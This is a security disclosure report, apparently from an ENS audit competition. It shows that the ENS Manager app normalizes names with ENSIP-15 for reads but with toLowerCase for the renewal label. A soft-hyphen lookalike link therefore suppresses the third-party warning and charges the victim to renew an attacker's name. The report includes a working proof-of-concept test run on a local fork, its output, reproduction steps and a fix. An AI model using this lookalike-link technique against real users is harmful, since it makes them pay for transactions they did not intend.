# 92591 w a critical manager reads the profile with ensip 15 and writes the renewal with tolowercase so a crafted link makes the victim s own profile suppress the third party renewal warning and&#x20;

**Submitted on Sep 10th 2026 at 19:59:57 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92591
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief

The Manager resolves a name twice with two different normalizers. Every read the profile and renew screens make is ENSIP-15 normalized. The label that goes into the on-chain `renew` call is produced by `String.prototype.toLowerCase()`. The two agree on ordinary names and disagree on any character ENSIP-15 removes.

U+00AD SOFT HYPHEN is such a character: ENSIP-15 deletes it, `toLowerCase()` keeps it, and it renders with no glyph at all.

So for a link to `treasury\u00AD.eth`:

```
heading on the page      treasury<U+00AD>.eth   renders as "treasury.eth"
owner lookup             treasury.eth           -> the VICTIM
expiry lookup            treasury.eth           -> the victim's own expiry
third-party warning      suppressed, because the victim "owns" it
label sent to renew()    treasury<U+00AD>       -> the ATTACKER's registration
```

The victim opens a page that is, on every surface, their own name. The wallet spends their USDC extending a registration they have never seen.

The proof drives the real ENS v2 contracts on the Anvil Sepolia fork this repository ships and asserts on the end state: the victim's expiry is unchanged, the attacker's is a year longer, and the victim paid for it.

## The read side is ENSIP-15

`apps/manager/src/routes/$name/index.tsx`

```
:50   loader: async ({ params: { name } ... })            RAW route param
:55   queryClient.fetchQuery(profileOwnerQuery(name))
:166  <ProfileView name={name} />                         RAW forwarded
```

`apps/manager/src/features/profile/service/profileOwner.ts`

```
:25   const ethName = normalizeEthName(params.name)
:56   ensjsv2_getOwner(client, { name: ethName.name })
```

and `profileName.ts:18` is `normalize(name)` imported from `viem/ens` on line 1, i.e. ENSIP-15.

The expiry takes the same route. `apps/manager/src/features/profile/service/profileExpiry.ts:77` calls `normalizeEth2LdName(name)` and lines 104-108 read the expiry for `ethName.name`.

`apps/manager/src/features/profile/components/view/ProfileView.tsx`

```
:99-101  useQuery(profileOwnerQuery(name))
:115     const owner = ownerData?.owner
:119     const isOwner = useIsOwner({ owner })
```

So `isOwner` answers a question about the ENSIP-15 form of the route param, not the route param itself.

## The guard this defeats

`apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx`

```
:66   if (shouldShowThirdPartyRenewalWarning(isOwner)) {  ...ThirdPartyRenewalDialog... }
:79-83  <LinkButton params={{ name }} to={getRenewalRoute(resolvedProtocol)}>
```

and `thirdPartyRenewalWarning.ts` is one line:

```
export const shouldShowThirdPartyRenewalWarning = (isOwner: boolean | undefined) => isOwner === false
```

The dialog it gates says, verbatim, "Renewing this name will add time to the current owner's registration. You won't gain ownership of the name." That is exactly what is about to happen — and because `isOwner` was computed for a different registration, the dialog never opens. The owner path fires instead and forwards the RAW parameter.

## The write side is toLowerCase

`apps/manager/src/routes/renew/$name.tsx`

```
:20   const parsedName = parseRenewableName(name)          RAW route param
:27   queryClient.ensureQueryData(profileExpiryQuery(name))
:60-63 return { label: parsedName.value.label, currentExpiry: expiryData.expiry }
```

`parseRenewableName` -> `parseName`, and `apps/manager/src/features/register-v2/utils/name-parser.ts:46` is:

```
const normalized = name.trim().toLowerCase()
```

That is the whole normalization. `INVALID_LABEL_CHARS` on line 11 is ASCII punctuation only and does not contain U+00AD; the `/\s/` check on line 49 does not match it either, because a soft hyphen is not whitespace. The label survives intact.

From there the label is the only thing that reaches the chain:

```
renewalUi.machine.ts:349            submitRenewal({ label: submission.label, ... })
registration.actors.ts:1072-1074    encodeRenewData(input.label, ...)
registration.actors.ts:1025-1030    renew(cleanLabel, duration, paymentToken, referrer)
```

## Preconditions

The victim holds `treasury.eth`. The attacker registers `treasury\u00AD.eth`. Nothing else is required of the victim beyond opening a link and renewing what the page presents as their own name.

The deployed registrar accepts labels containing U+00AD — the proof registers one against the real `ETHRegistrar` rather than assuming it. The Manager's own registration path will also produce one, since it uses the same `parseName`.

## Impact

Row 6285 — causing the application to display an incorrect name or transaction detail so that a user submits a transaction to an unintended recipient. The heading, the owner and the expiry on screen all belong to the victim's registration; the rent is paid into a different one.

Row 6288 — modifying transaction arguments. The `label` argument of `renew` is not the label of the name the page resolved, displayed and authorized.

## Limits, stated plainly

The victim's name is not taken, transferred or bricked. The loss is the rent payment plus the renewal the victim believes they have bought and has not; if their name was near expiry, the consequence is that it still is.

The attacker gains a funded extension on their own registration. There is no path here by which they acquire the victim's name.

This needs the attacker to register the twin before the victim clicks, and it needs the victim to reach the profile by a link rather than by typing the name. A link is the ordinary way a name is shared.

I am aware this sits in the same family as findings already accepted on the Explorer's renewal surface. This one is a different app, a different parser (`toLowerCase()` rather than `getLabel`/`ens_normalize`), and it additionally disables a purpose-built guard rather than merely mislabelling a screen. I would rather state the relationship than have it discovered.

## Recommended fix

Use one normalizer. `parseName` should apply ENSIP-15 — the same `normalize` that `profileName.ts` already imports — so that the label the renewal signs is the label the page resolved. Failing that, reject any route parameter whose ENSIP-15 form differs from its raw form before rendering the profile, and compute the third-party check against the same string the renewal will use.

## Proof of Concept

## What this proves

The test below drives the deployed ENS v2 contracts on the Anvil Sepolia fork this repository's own `pnpm e2e:infra:up` brings up. It registers two real registrations — the victim's `treasury<ts>.eth` and the attacker's soft-hyphen twin — runs production's own helpers to decide what the page would show and whether the third-party warning would fire, then submits the exact `renew` calldata the flow builds and reads the expiries back off chain state.

The assertions are on `getExpiry` and the victim's USDC balance after the transaction, not on string comparison.

## Environment

Frozen revision under test: 1c9b47f. No live deployment is touched.

```
pnpm install
pnpm e2e:infra:up          # Anvil fork of Sepolia on 127.0.0.1:8545, chainId 11155111
```

Save the file below as:

```
apps/manager/src/features/renew/poc-manager-renew-wrong-name-onchain.test.ts
```

Run it:

```
cd apps/manager
pnpm vitest run src/features/renew/poc-manager-renew-wrong-name-onchain.test.ts
```

The file must be saved with the literal U+00AD byte sequence in the `SH` constant on the line marked `const SH = ...`. If your editor strips it, replace that line with:

```
const SH = String.fromCharCode(0x00ad)
```

## Result, verbatim from the run

`<U+00AD>` below is this transcript rendering the soft hyphen; on screen it has no glyph, so both names read as `treasurymtvxxlcz.eth`.

```
RUN  v4.1.5 .../apps/manager

[poc] crafted route param      : treasurymtvxxlcz<U+00AD>.eth
[poc] name used for page reads : treasurymtvxxlcz.eth
[poc] owner the page reports   : 0x53e3d06ccae5c64cc0f68093cc37fb2ceb51ac2a
[poc] third-party warning shown: false
[poc] label sent to renew()    : treasurymtvxxlcz<U+00AD>
[poc] treasurymtvxxlcz.eth (victim)   expiry 1820607567 -> 1820607567
[poc] treasurymtvxxlcz<U+00AD>.eth (attacker) expiry 1883679643 -> 1915215643
[poc] victim USDC 9991999979 -> 9983999958 (paid 8000021)
[poc] victim   = 0x53e3d06ccae5c64cc0f68093cc37fb2ceb51ac2a
[poc] attacker = 0xe67ce0fb3a73d7a2556b9bea2ebf29f85ca54c40

Test Files  1 passed (1)
     Tests  2 passed (2)
```

Reading those lines in order: the page resolved, displayed and authorized `treasurymtvxxlcz.eth`, reported the victim as its owner, and therefore did not warn. The renewal went to the other registration. `1915215643 - 1883679643 = 31536000`, exactly the one year purchased. The victim's own expiry did not move, and 8.000021 USDC left the victim's wallet.

Labels carry a timestamp so the test is idempotent, and both actors are freshly generated keys per run, so the pre-state assertions are meaningful rather than inherited.

## Steps to reproduce in the UI

1. The attacker registers the soft-hyphen twin of a name the victim already holds. The deployed registrar accepts it; the proof registers one rather than assuming it.
2. The attacker shares a link to the twin — `/treasury<U+00AD>.eth`. It renders indistinguishably from the victim's own name, in the address bar and in the page heading.
3. The victim opens it while connected. routes/$name/index.tsx:55 and profileOwner.ts:25 normalize with ENSIP-15, so the owner lookup returns the victim, and profileExpiry.ts:77 shows the victim's own expiry.
4. ProfileView\.tsx:119 sets isOwner true. ProfileRenewAction.tsx:66 therefore does NOT open the ThirdPartyRenewalDialog, and renders the plain "Renew Name" link, forwarding the raw parameter.
5. The victim clicks it. routes/renew/$name.tsx:20 parses the raw parameter with parseName, whose only normalization is `name.trim().toLowerCase()` — the soft hyphen survives.
6. The victim approves and signs. registration.actors.ts:1025-1030 sends `renew(label, duration, paymentToken, referrer)` with the twin's label.
7. Read the expiries back. The twin got a year. The victim's name got nothing, and the victim paid.

## Full test file

/\*\*

* PoC — the Manager's Renew flow reads the page with ENSIP-15 and writes the
* renewal with `toLowerCase()`, so a crafted link makes the victim's own
* profile suppress its "you are renewing someone else's name" warning and then
* charges the victim to extend an attacker's registration.
*
* Drives the real ENS v2 contracts on the local Anvil Sepolia fork and asserts
* on the END STATE: whose registration got longer, and whose USDC paid for it.
*
* Requires: pnpm e2e:infra:up
*
* Production chain under test (frozen revision 1c9b47f):
*
* READ side — every lookup the page makes is ENSIP-15 normalized:
* routes/$name/index.tsx:50,55 profileOwnerQuery(name)
* ```
  -> profileOwner.ts:25          normalizeEthName(params.name)   viem normalize()
  ```
* ```
  -> profileOwner.ts:56          ensjsv2_getOwner({ name: ethName.name })
  ```
* profileExpiry.ts:77,105-108 normalizeEth2LdName(name) -> ensjsv2\_getExpiry
* ProfileView\.tsx:99-101,115,119 isOwner = useIsOwner({ owner })
*
* GUARD:
* ProfileRenewAction.tsx:66 shouldShowThirdPartyRenewalWarning(isOwner)
* ```
                                   -> warns ONLY when isOwner === false
  ```
* ProfileRenewAction.tsx:79-83 \<LinkButton params={{ name }} to="/renew/$name">
*
* WRITE side — the label is produced by a different normalizer:
* routes/renew/$name.tsx:20 parseRenewableName(name)
* ```
  -> name-parser.ts:46            name.trim().toLowerCase()      NOT ENSIP-15
  ```
* renewalUi.machine.ts:349 submitRenewal({ label })
* registration.actors.ts:1020-30 renew(cleanLabel, duration, paymentToken, referrer)
*
* U+00AD SOFT HYPHEN is the separator between the two normalizers: ENSIP-15
* deletes it, `toLowerCase()` preserves it, and it renders with no glyph. \*/ import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain' import { getExpiry } from '@ensdomains/ensjs/public/v2' import { universalResolverV2FindOwnerSnippet } from '@ensdomains/ensjs-abi/universalResolver' import { type Address, createPublicClient, createWalletClient, encodeFunctionData, http, keccak256, parseAbi, stringToBytes, zeroAddress, zeroHash, } from 'viem' import { privateKeyToAccount } from 'viem/accounts' import { packetToBytes } from 'viem/ens' import { toHex } from 'viem/utils' import { describe, expect, it } from 'vitest' import { normalizeEth2LdName, normalizeEthName, } from '@/features/profile/service/profileName' import { parseRenewableName } from '@/features/renew/utils/renewableName' import { shouldShowThirdPartyRenewalWarning } from '@/features/renew/utils/thirdPartyRenewalWarning'

const SH = '­' // SOFT HYPHEN — zero-width when rendered

const RPC = '<http://127.0.0.1:8545>' const c = ensL1Contracts\[supportedL1Chains.sepolia] const REGISTRAR = c.ensEthRegistrar.address const REGISTRY = c.ensRegistry.address const USDC = c.usdc.address const DEDICATED\_RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d' as const

const REG = parseAbi(\[ 'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)', 'function commit(bytes32 commitment)', 'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)', 'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)', 'function MIN\_COMMITMENT\_AGE() view returns (uint64)', 'function isAvailable(string label) view returns (bool)', ]) // registration.actors.ts:1026-1030 — the exact renew the flow submits. const RENEW = parseAbi(\[ 'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)', ]) const ERC20 = parseAbi(\[ 'function mint(address to, uint256 amount)', 'function approve(address spender, uint256 amount) returns (bool)', 'function balanceOf(address account) view returns (uint256)', ])

const pc = createPublicClient({ transport: http(RPC) }) const chain = { id: 11155111, name: 'anvil', nativeCurrency: { name: 'E', symbol: 'E', decimals: 18 }, rpcUrls: { default: { http: \[RPC] } }, } as const const FUNDER = privateKeyToAccount( '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80', ) const randomKey = () => `0x${Array.from(crypto.getRandomValues(new Uint8Array(32))) .map((b) => b.toString(16).padStart(2, '0')) .join('')}` as `0x${string}` const VICTIM = privateKeyToAccount(randomKey()) const ATTACKER = privateKeyToAccount(randomKey())

const wc = (a: typeof FUNDER) => createWalletClient({ account: a, chain, transport: http(RPC) }) const wait = (h: `0x${string}`) => pc.waitForTransactionReceipt({ hash: h }) const rpc = (m: string, p: unknown\[] = \[]) => fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }), }).then((r) => r.json()) const send = async (acct: typeof FUNDER, to: Address, data: `0x${string}`) => wait(await wc(acct).sendTransaction({ to, data })) const YEAR = 365n \* 24n \* 60n \* 60n

// happy-dom replaces globalThis.console, so write straight to stdout. const log = (m: string) => process.stdout.write(m + String.fromCharCode(10)) // Render soft hyphens visibly so the transcript is readable. const show = (s: string) => s.replaceAll(SH, '\<U+00AD>')

async function register(label: string, acct: typeof FUNDER, duration: bigint) { // Anvil's well-known accounts carry EOF code on the Sepolia fork; ERC1155 // \_safeMint rejects contract receivers, so clear it first. await rpc('anvil\_setCode', \[acct.address, '0x']) const avail = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'isAvailable', args: \[label], }) if (!avail) throw new Error(`${show(label)} not available`) await send( FUNDER, USDC, encodeFunctionData({ abi: ERC20, functionName: 'mint', args: \[acct.address, 10\_000\_000\_000n], }), ) const secret = keccak256(stringToBytes(`s-${label}`)) const cm = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'makeCommitment', args: \[ label, acct.address, secret, zeroAddress, DEDICATED\_RESOLVER, duration, zeroHash, ], }) await send( acct, REGISTRAR, encodeFunctionData({ abi: REG, functionName: 'commit', args: \[cm] }), ) const ma = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'MIN\_COMMITMENT\_AGE', }) await rpc('evm\_increaseTime', \[Number(ma) + 10]) await rpc('evm\_mine') const \[b, p] = await pc.readContract({ address: REGISTRAR, abi: REG, functionName: 'getRegisterPrice', args: \[label, duration, USDC], }) await send( acct, USDC, encodeFunctionData({ abi: ERC20, functionName: 'approve', args: \[REGISTRAR, (b + p) \* 2n], }), ) await send( acct, REGISTRAR, encodeFunctionData({ abi: REG, functionName: 'register', args: \[ label, acct.address, secret, zeroAddress, DEDICATED\_RESOLVER, duration, USDC, zeroHash, ], }), ) }

// profileExpiry.ts:104-108 — production's own expiry read. const expiryOf = (name: string) => getExpiry(pc as never, { name, registryAddress: REGISTRY }) // profileOwner.ts:56 — production's own owner read. const ownerOf = (name: string) => pc.readContract({ address: c.ensUniversalResolver.address, abi: universalResolverV2FindOwnerSnippet, functionName: 'findOwner', args: \[toHex(packetToBytes(name))], }) const usdcOf = (a: Address) => pc.readContract({ address: USDC, abi: ERC20, functionName: 'balanceOf', args: \[a], })

describe('Manager Renew: read with ENSIP-15, write with toLowerCase', () => { it('renews the attacker twin while the profile reports the victim as owner', async () => { const ts = Date.now().toString(36) const victimLabel = `treasury${ts}` // the victim's real registration const twinLabel = `treasury${ts}${SH}` // the attacker's invisible twin const victimName = `${victimLabel}.eth` const twinName = `${twinLabel}.eth`

```
for (const a of [VICTIM, ATTACKER]) {
  await rpc('anvil_setBalance', [a.address, '0x21e19e0c9bab2400000'])
}

// The two labels are different registrations, but ENSIP-15 collapses the
// twin onto the victim's name and the twin renders with no extra glyph.
expect(twinLabel).not.toBe(victimLabel)
expect(twinLabel.replaceAll(SH, '')).toBe(victimLabel)

await register(victimLabel, VICTIM, YEAR)
await register(twinLabel, ATTACKER, 3n * YEAR)

const victimExpiryBefore = await expiryOf(victimName)
const twinExpiryBefore = await expiryOf(twinName)
expect(victimExpiryBefore).toBeGreaterThan(0n)
expect(twinExpiryBefore).toBeGreaterThan(0n)
expect(victimExpiryBefore).not.toBe(twinExpiryBefore)

// === the crafted link the victim opens ================================
const routeParam = twinName // /treasury<ts><U+00AD>.eth — renders as the victim's own name

// --- READ side: every page lookup is ENSIP-15 normalized ---------------
// profileOwner.ts:25 — production helper, on the raw route param.
const normalizedForReads = normalizeEthName(routeParam)
expect(normalizedForReads).not.toBeNull()
expect(normalizedForReads?.name).toBe(victimName)

// profileOwner.ts:56 — the owner the page displays.
const pageOwnerAddress = await ownerOf(normalizedForReads?.name as string)
expect(pageOwnerAddress.toLowerCase()).toBe(VICTIM.address.toLowerCase())

// ProfileView.tsx:119 — so the connected victim is "the owner".
const isOwner =
  pageOwnerAddress.toLowerCase() === VICTIM.address.toLowerCase()
expect(isOwner).toBe(true)

// profileExpiry.ts:77 — the expiry the page shows is the victim's own.
const expiryName = normalizeEth2LdName(routeParam)?.name
expect(expiryName).toBe(victimName)
const displayedExpiry = await expiryOf(expiryName as string)
expect(displayedExpiry).toBe(victimExpiryBefore)

// --- GUARD -------------------------------------------------------------
// ProfileRenewAction.tsx:66 — the warning that exists precisely to stop a
// user paying to extend someone else's registration. Production helper.
const warns = shouldShowThirdPartyRenewalWarning(isOwner)
expect(warns).toBe(false)

// --- WRITE side: a different normalizer --------------------------------
// routes/renew/$name.tsx:20 — production parser, same raw route param.
const parsed = parseRenewableName(routeParam)
expect(parsed.isOk()).toBe(true)
const label = parsed._unsafeUnwrap().label
expect(label).toBe(twinLabel)
expect(label).not.toBe(victimLabel)

// --- the transaction the flow submits ----------------------------------
const victimUsdcBefore = await usdcOf(VICTIM.address)
await send(
  VICTIM,
  USDC,
  encodeFunctionData({
    abi: ERC20,
    functionName: 'approve',
    args: [REGISTRAR, 10_000_000_000n],
  }),
)
await send(
  VICTIM,
  REGISTRAR,
  encodeFunctionData({
    abi: RENEW,
    functionName: 'renew',
    args: [label, YEAR, USDC, zeroHash],
  }),
)
const victimUsdcAfter = await usdcOf(VICTIM.address)

// --- end state ---------------------------------------------------------
const victimExpiryAfter = await expiryOf(victimName)
const twinExpiryAfter = await expiryOf(twinName)

log(`[poc] crafted route param      : ${show(routeParam)}`)
log(`[poc] name used for page reads : ${normalizedForReads?.name}`)
log(`[poc] owner the page reports   : ${pageOwnerAddress.toLowerCase()}`)
log(`[poc] third-party warning shown: ${warns}`)
log(`[poc] label sent to renew()    : ${show(label)}`)
log(
  `[poc] ${victimName} (victim)   expiry ${victimExpiryBefore} -> ${victimExpiryAfter}`,
)
log(
  `[poc] ${show(twinName)} (attacker) expiry ${twinExpiryBefore} -> ${twinExpiryAfter}`,
)
log(
  `[poc] victim USDC ${victimUsdcBefore} -> ${victimUsdcAfter} (paid ${
    victimUsdcBefore - victimUsdcAfter
  })`,
)
log(`[poc] victim   = ${VICTIM.address.toLowerCase()}`)
log(`[poc] attacker = ${ATTACKER.address.toLowerCase()}`)

// The victim paid.
expect(victimUsdcAfter).toBeLessThan(victimUsdcBefore)
// The name the page showed as theirs did NOT get longer.
expect(victimExpiryAfter).toBe(victimExpiryBefore)
// The attacker's registration did, by exactly the purchased term.
expect(twinExpiryAfter - twinExpiryBefore).toBe(YEAR)
```

}, 600\_000)

it('control: for a name ENSIP-15 leaves alone, both normalizers agree', () => { const ts = Date.now().toString(36) const name = `plain${ts}.eth` expect(normalizeEthName(name)?.name).toBe(name) expect(parseRenewableName(name).\_unsafeUnwrap().label).toBe(`plain${ts}`) }) })
